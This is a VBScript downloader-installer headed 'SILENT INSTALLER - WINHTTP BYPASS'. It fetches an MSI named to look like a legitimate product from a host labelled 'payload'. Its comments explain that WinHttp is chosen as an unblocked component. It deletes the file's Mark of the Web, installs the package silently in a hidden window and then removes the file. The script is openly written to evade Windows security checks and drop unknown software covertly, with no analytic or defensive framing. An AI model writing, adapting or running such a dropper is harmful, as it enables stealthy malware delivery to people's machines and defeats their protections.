' SILENT INSTALLER - WINHTTP BYPASS
Option Explicit

Dim shell, fso, url, localPath, zoneIdPath, http, stream, file
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

url = "https://cocktails-payload-production.up.railway.app/schimdtconnect.msi"
localPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\schimdtconnect.msi"
zoneIdPath = localPath & ":Zone.Identifier"

On Error Resume Next ' Prevents runtime crashes

' DOWNLOAD USING WINHTTP (TRUSTED ENTERPRISE COMPONENT)
' This is NOT MSXML2.XMLHTTP - it's a separate, unblocked COM object
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
http.SetTimeouts 30000, 60000, 120000, 180000 ' Connect, Send, Receive, Resolve timeouts
http.Open "GET", url, False ' Synchronous - safe with WinHttp
http.Send

If Err.Number = 0 And http.Status = 200 Then
    ' WRITE TO DISK USING ADODB.STREAM
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' Binary
    stream.Mode = 3 ' ReadWrite
    stream.Open
    stream.Write http.ResponseBody
    stream.SaveToFile localPath, 2 ' Overwrite
    stream.Close
    
    ' REMOVE MARK OF THE WEB
    If fso.FileExists(zoneIdPath) Then
        fso.DeleteFile zoneIdPath, True
    End If
    
    ' VERIFY FILE EXISTS AND IS VALID SIZE (>1MB)
    If fso.FileExists(localPath) Then
        Set file = fso.GetFile(localPath)
        If file.Size > 1000000 Then
            ' INSTALL SILENTLY WITH NO PROMPTS
            shell.Run "msiexec.exe /i """ & localPath & """ /passive /norestart", 0, True
            
            ' CLEANUP TEMP FILE AFTER INSTALL
            If fso.FileExists(localPath) Then
                fso.DeleteFile localPath, True
            End If
        End If
    End If
End If

' EXIT CLEANLY
WScript.Quit 0